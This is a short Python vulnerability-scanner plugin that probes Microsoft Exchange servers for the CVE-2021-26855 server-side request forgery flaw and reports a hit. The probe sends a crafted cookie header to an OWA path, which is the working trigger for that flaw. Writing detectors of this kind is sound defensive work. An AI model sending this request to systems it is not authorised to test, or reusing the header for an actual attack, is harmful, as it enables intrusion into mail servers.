from lib.poc.dummy import *


headers = {'Cookie': 'X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; '
                     'X-BEResource=localhost/owa/auth/logon.aspx?~3;'}


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    try:
        url = '{}://{}:{}/owa/auth/y.js'.format(service, ip, port)
        r = await http_client(ip, port).get(url, headers=headers, timeout=20)

        if r.status_code == 500 and 'NegotiateSecurityContext failed with for host' in r.text:
            ret = {
                'alert_group': 'Exchange Server Server-Side Request Forgery (SSRF)',
                'affects': '{}://{}:{}'.format(service, ip, port),
                'details': '{}\n{}\nMicrosoft Exchange Server Server-Side Request Forgery (SSRF) '
                           'vulnerability (CVE-2021-26855)'.format(url, headers)
            }
            return ret
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 80, 'http', True, {})
    run_plugin_test(scan)
